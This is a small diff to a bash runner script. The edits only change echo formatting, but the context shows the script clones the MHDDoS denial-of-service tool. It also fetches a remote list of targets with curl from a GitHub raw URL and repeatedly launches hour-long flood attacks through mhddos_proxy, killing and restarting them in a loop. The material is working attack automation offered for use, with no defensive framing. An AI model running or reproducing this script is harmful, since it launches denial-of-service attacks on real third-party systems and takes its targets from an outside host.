@@ -50,7 +50,7 @@ git clone https://github.com/MHProDev/MHDDoS.git
 python3 -m pip install -r MHDDoS/requirements.txt
 
 while true
-echo "#####################################"
+echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py" | wc -l)
@@ -79,7 +79,7 @@ do
             
             python3 ~/mhddos_proxy/$cmd_line" --period 3600"&
    done
-echo "#####################################"
+echo -e "#####################################\n"
 sleep $restart_interval
 echo -e "RESTARTING\n"
 pkill -f start.py #in theory should work but doesn't give good results
